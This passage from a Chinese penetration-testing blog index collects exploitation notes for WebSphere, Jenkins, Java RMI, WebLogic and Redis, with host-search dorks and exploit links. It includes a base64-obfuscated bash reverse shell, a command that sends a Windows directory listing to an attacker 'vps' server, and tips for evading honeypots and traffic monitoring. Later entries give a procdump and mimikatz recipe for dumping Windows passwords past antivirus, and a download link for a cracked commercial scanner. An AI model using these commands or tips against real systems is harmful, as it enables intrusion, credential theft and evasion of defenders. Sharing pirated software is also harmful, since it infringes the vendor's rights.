反序列化远程代码执行</h1></li><li><p>漏洞简介<br>Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),<br>近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)</p></li><li><p>影响组件<br>WebSphere</p></li><li><p>漏洞指纹<br>WebSphere<br>8880</p></li><li><p>Fofa Dork<br>app=”IBM-WebSphere”</p></li><li><p>漏洞分析<br>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a><br>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394">https://xz.aliyun.com/t/6394</a></p></li><li><p>漏洞利用<br>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a><br>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394">https://xz.aliyun.com/t/6394</a></p></li><li><p>利用技巧</p></li><li><p>Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的<br>Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区<br><a href="https://xz.aliyun.com/t/309">https://xz.aliyun.com/t/309</a></p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p></li><li><p>升级到最新版</p><h1 id="Jenkins-系列漏洞"><a href="#Jenkins-系列漏洞" class="headerlink" title="Jenkins 系列漏洞"></a>Jenkins 系列漏洞</h1></li><li><p>漏洞简介<br>Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令</p></li><li><p>影响组件<br>Jenkins</p></li><li><p>漏洞指纹<br>Jenkins</p></li><li><p>Fofa Dork<br>app=”Jenkins”</p></li><li><p>漏洞分析<br>Jenkins RCE漏洞分析汇总<br><a href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#%EF%BF%A6%EF%BE%80%EF%BE%BB%EF%BF%A7%EF%BE%BB%EF%BE%93">http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a><br>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p></li><li><p>漏洞利用<br>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a><br>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a><br>gquere/pwn_jenkins: Notes about attacking Jenkins servers<br><a href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p></li><li><p>利用技巧</p></li><li><p>Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p></li><li><p>升级到最新版</p><h1 id="RMI-对外开放"><a href="#RMI-对外开放" class="headerlink" title="RMI 对外开放"></a>RMI 对外开放</h1></li><li><p>漏洞简介<br>Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集<br>通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.</p></li><li><p>影响组件<br>java*</p></li><li><p>漏洞指纹<br>1098, 1099, 1090, 8901, 8902, 8903<br>N\x00<br>rmiregistry</p></li><li><p>Fofa Dork<br>protocol==”java-rmi”</p></li><li><p>漏洞分析<br>RMI-反序列化 – 先知社区<br><a href="https://xz.aliyun.com/t/6660">https://xz.aliyun.com/t/6660</a></p></li><li><p>漏洞利用<br>Java RMI服务远程命令执行利用_91Ri.org<br><a href="http://www.91ri.org/15276.html">http://www.91ri.org/15276.html</a></p></li><li><p>利用技巧</p></li><li><p>rmi一般在内网开放的比较多, nmap 扫描如下<br>nmap -v 8.8.8.8 -p1099 -sV –script=rmi*</p></li><li><p>防护方法</p></li><li><p>设置强口令</p></li><li><p>尽量不要开放到公网</p></li><li><p>限制来源IP</p><h1 id="Weblogic-T3-协议漏洞"><a href="#Weblogic-T3-协议漏洞" class="headerlink" title="Weblogic T3 协议漏洞"></a>Weblogic T3 协议漏洞</h1></li><li><p>漏洞简介<br>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p></li><li><p>影响组件<br>Weblogic</p></li><li><p>漏洞指纹<br>Lcom.tangosol.util.extractor.ReflectionExtractor<br>…</p></li><li><p>Fofa Dork<br>protocol==”weblogic”</p></li><li><p>漏洞分析<br>相关漏洞有:<br>CVE-2017-3248<br><a href="https://paper.seebug.org/333/">https://paper.seebug.org/333/</a><br>CVE-2018-2628<br><a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/</a><br>CVE-2018-2893<br><a href="https://www.freebuf.com/vuls/178105.html">https://www.freebuf.com/vuls/178105.html</a><br>CVE-2019-2890<br><a href="https://paper.seebug.org/1069/">https://paper.seebug.org/1069/</a><br>CVE-2020-2555(Oracle Coherence)<br><a href="https://paper.seebug.org/1141/">https://paper.seebug.org/1141/</a><br>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.<br><a href="https://www.oracle.com/security-alerts/cpuapr2020.html">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p></li><li><p>漏洞利用<br>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a><br>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555">https://github.com/Y4er/CVE-2020-2555</a></p></li><li><p>利用技巧</p></li><li><p>T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap<br>nmap -sV –script=weblogic-t3-info.nse -p 7001</p></li><li><p>内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用<br>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial">https://github.com/Bort-Millipede/WLT3Serial</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>禁用T3协议</p></li><li><p>禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p><h1 id="Weblogic-XMLDecoder反序列化"><a href="#Weblogic-XMLDecoder反序列化" class="headerlink" title="Weblogic XMLDecoder反序列化"></a>Weblogic XMLDecoder反序列化</h1></li><li><p>漏洞简介<br>2017年4月Oacle官方安全通告, 包含了对与CVE编号CVE-2017-3506的修复补丁, wls-wsat这个提供的web service服务中, 处理xml数据的的时候, XMLDecoder的反序列化漏洞风险, 同年10月份的补丁中的则是对其绕过的修复, CVE编号为CVE-2017-10271.<br>2019年4月17日, CNVD 发布《关于Oracle WebLogic wls9-async组件存在反序列化远程命令执行漏洞的安全公告》, 部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogic Server提供异步通讯服务.由于该WAR包在反序列化处理输入信息时存在缺陷, 攻击者可以发送精心构造的恶意 HTTP 请求, 获得目标服务器的权限, 在未授权的情况下远程执行命令.</p></li><li><p>影响组件<br>WebLogic 10.X<br>WebLogic 12.1.3</p></li><li><p>漏洞指纹<br>/wls-wsat/CoordinatorPortType<br>/_async/AsyncResponseService<br>/_async/AsyncResponseServiceSoap12</p></li><li><p>Fofa Dork<br>app=”WebLogic-Server”</p></li><li><p>漏洞分析<br>（CVE-2017-3506 &amp;CVE-2017-10271）<br><a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/</a><br>CVE-2019-2725<br><a href="https://paper.seebug.org/909/">https://paper.seebug.org/909/</a></p></li><li><p>漏洞利用<br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p></li><li><p>利用技巧</p></li><li><p>由于nginx转发问题, 尝试这种路径, 可能有惊喜<br>/../wls-wsat/CoordinatorPortType11<br>/../_async/AsyncResponseService</p></li><li><p>Weblogic 写shell有个技巧<br>可以通过find/grep命令查找静态文件的路径, 然后将命令结果输出到静态文件夹中, 比如查找前台的logo.webp / /static/css/main.css</p></li><li><p>防护方法</p></li><li><p>通过访问策略控制禁止外部/_async/* 及 /wls-wsat/*路径的URL访问；</p></li><li><p>删除对应war包并重启 webLogic；</p></li><li><p>限制源IP对应 weblogic 7001端口的访问.</p><h1 id="Weblogic-IIOP"><a href="#Weblogic-IIOP" class="headerlink" title="Weblogic IIOP"></a>Weblogic IIOP</h1></li><li><p>漏洞简介<br>2017年4月Oacle官方安全通告中, 包含了对与CVE编号CVE-2020-2551的补丁, 未经身份验证的攻击者可以通过IIOP对Oracle WebLogic Server进行攻击, 造成远程代码执行.</p></li><li><p>影响组件<br>Oracle WebLogic Server version:</p></li><li><p>3.6.0.0</p></li><li><p>1.3.0.0</p></li><li><p>2.1.3.0 and 12.2.1.4.0</p></li><li><p>漏洞指纹<br>GIOP &amp;&amp; com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</p></li><li><p>Fofa Dork<br>app=”WebLogic-Server”</p></li><li><p>漏洞分析<br>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/">https://paper.seebug.org/1138/</a></p></li><li><p>漏洞利用<br>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551">https://github.com/Y4er/CVE-2020-2551</a></p></li><li><p>利用技巧<br>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/201005">https://www.anquanke.com/post/id/201005</a></p></li><li><p>防护方法</p></li><li><p>及时更新补丁</p></li><li><p>通过 Weblogic 控制台进行关闭 IIOP 协议</p><h1 id="Redis-相关漏洞"><a href="#Redis-相关漏洞" class="headerlink" title="Redis 相关漏洞"></a>Redis 相关漏洞</h1></li><li><p>漏洞简介<br>Redis 在近几年也是攻击的重点, 早期Redis默认没有密码, 且经常开放到公网, Redis可以进行文件写入, 以及后面的主从复制远程代码执行漏洞, 或者配合缓存序列化数据进行操作</p></li><li><p>影响组件<br>Redis</p></li><li><p>漏洞指纹<br>6379</p></li><li><p>Fofa Dork<br>app=”Redis” &amp;&amp; “redis_version”</p></li><li><p>漏洞分析<br>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p></li><li><p>漏洞利用<br>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p></li><li><p>利用技巧</p></li><li><p>当Redis 权限满足写文件时<br>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p></li><li><p>当Redis 权限不满足写文件时<br>发现Redis记录中存在JSON串的时候, 可以尝试写入Fastjson或Jackson的反序列化漏洞<br>发现Redis记录中存在AC ED这种反序列化特征的时候, 可以尝试写入ysoserial产生的序列化数据</p></li><li><p>防护方法</p></li><li><p>Redis 设置强口令</p></li><li><p>Redis 尽量不要开放到公网</p></li><li><p>限制来源IP</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1></li><li><p>记得躲避蜜罐, 现在身份识别蜜罐基本都是使用jsonp进行互联网身份识别, 随便抽一个蜜罐, 公网大概一百多台<br>搜索结果 – FOFA网络空间测绘系统<br><a href="https://fofa.so/result?q=%22var+jtoken=%27%22&amp;qbase64=InZhciBqdG9rZW49JyI=">https://fofa.so/result?q=%22var+jtoken%3D%27%22&amp;qbase64=InZhciBqdG9rZW49JyI%3D</a></p></li><li><p>反弹shell 可以使用openssl反弹443端口, 现在厂商一般都有流量监控设备, 直接明文传输会被审查到<br>Reverse shell cheatsheet 多种反弹shell的命令<br><a href="https://krober.biz/misc/reverse_shell.php">https://krober.biz/misc/reverse_shell.php</a></p></li><li><p>很多时候执行命令不能有特殊符号, 比如尖角号之类的, 可以使用 base64进行传参<br>bash -i &gt;&amp; /dev/tcp/127.0.0.1/1337 0&gt;&amp;1<br>base64 可以转换成<br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx<br>最终可以变成<br>bash -c “{echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTMzNyAwPiYx}|{base64, -d}|{bash, -i}”</p></li><li><p>windows机器可以使用ie浏览器带数据出来, 很多杀软不会拦截ie浏览器, unc 传输文件也可以<br>for /f %s in (‘dir c:\ /b’) do explorer <a href="http://vps:8000/?%25s">http://vps:8000/?%s</a><br>\vps\share\shell.bat</p></li><li><p>针对很多时候java类漏洞, 比如反序列化, rmi, jmx, iiop等情况, 时常会遇到timeout的情况<br>这里主要是没有指定hostname, 这里可以使用socat进行流量转发, 无需修改POC, 以CVE-2019-12409为例<br>这里针对 ENABLE_REMOTE_JMX_OPTS 远程代码执行(CVE-2019-12409) 多说一点, 因为这个问题在所有的jmx连接中都有可能出现<br>这里存在一个问题, JMX Server如果在启动时没有指明hostname, 那么在客户端与服务器交互过程中, 有一步返回 stub rmiserver的过程, 其中地址可能为内网地址<br>通过查看报错, 可以得知内网地址, 例如 172.18.0.2<br>使用如下两条命令即可执行, 替换 [报错中的ip], [远程目标的ip]<br>ip addr add [报错中的ip]/24 dev lo<br>socat tcp4-listen:18983, bind=[报错中的ip], reuseaddr, fork tcp4-connect:[远程目标的ip]:18983</p></li></ol><p>6.Java 反序列化是这两年的重中之重, 如果有shell出不来可以参考以下链接<br>深入理解JAVA反序列化漏洞 | 漏洞盒子 | 互联网安全测试众测平台<br><a href="https://www.vulbox.com/knowledge/detail/?id=11">https://www.vulbox.com/knowledge/detail/?id=11</a><br>tomcat不出网回显连续剧第六集 – 先知社区<br><a href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a><br>Weblogic T3/iiop 构造有回显exp方案分析 – 先知社区<br><a href="https://xz.aliyun.com/t/7489">https://xz.aliyun.com/t/7489</a><br>weblogic IIOP漏洞的回显构造研究 – 先知社区<br><a href="https://xz.aliyun.com/t/7393">https://xz.aliyun.com/t/7393</a><br>linux下java反序列化通杀回显方法的低配版实现 – 先知社区<br><a href="https://xz.aliyun.com/t/7307">https://xz.aliyun.com/t/7307</a><br>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/232544.html">https://www.freebuf.com/vuls/232544.html</a><br>如何绕过高版本JDK限制进行JNDI注入利用<br><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a><br>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI">https://github.com/JosephTribbianni/JNDI</a><br>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题<br>最后祝大家 开局有0day, 处处弱口令</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弹药库 </tag>
            
            <tag> 漏洞库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过杀软获取管理员密码姿势</title>
      <link href="2020/04/18/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
      <url>2020/04/18/%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191424743.webp" alt="image"></p><pre><code>    可通利用procdump导出lsass进程数据获取lsass.exe进程中储存的名文密码</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191861031.webp" alt="image"></p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp  保存lsass数据为lsass.dmp</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587191941306.webp" alt="image"></p><p>下载到本地使用mimikatz 进行解密获取名文密码</p><pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonPasswords&quot;</code></pre><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1587192063514.webp" alt="image"></p><h3 id="注：08系统往前内存储存为名文-往后为哈希值需自行解密！！！"><a href="#注：08系统往前内存储存为名文-往后为哈希值需自行解密！！！" class="headerlink" title="注：08系统往前内存储存为名文 往后为哈希值需自行解密！！！"></a>注：08系统往前内存储存为名文 往后为哈希值需自行解密！！！</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 密码抓取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap高清思维导图</title>
      <link href="2020/04/07/sqlmaptu/"/>
      <url>2020/04/07/sqlmaptu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一张图概括  -6 -<br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586260914723.webp" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 思维导图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netsparker Enterprise Edition5.3 破解版</title>
      <link href="2020/04/07/Untitled/"/>
      <url>2020/04/07/Untitled/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586259981892.webp" alt="image"><br><img src= "/img/loading.gif" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/images/1586259981916.webp" alt="image"></p><p>下载地址:链接：<a href="https://pan.baidu.com/s/1SU0p3u-l1aOV0aAGJ_wuRg">https://pan.baidu.com/s/1SU0p3u-l1aOV0aAGJ_wuRg</a><br>                提取码：1qn8</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Netsparker </tag>
            
            <tag> 破解软件 </tag>
            
            <tag> 漏洞扫描 </tag>
            
            <tag> 软件下载 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
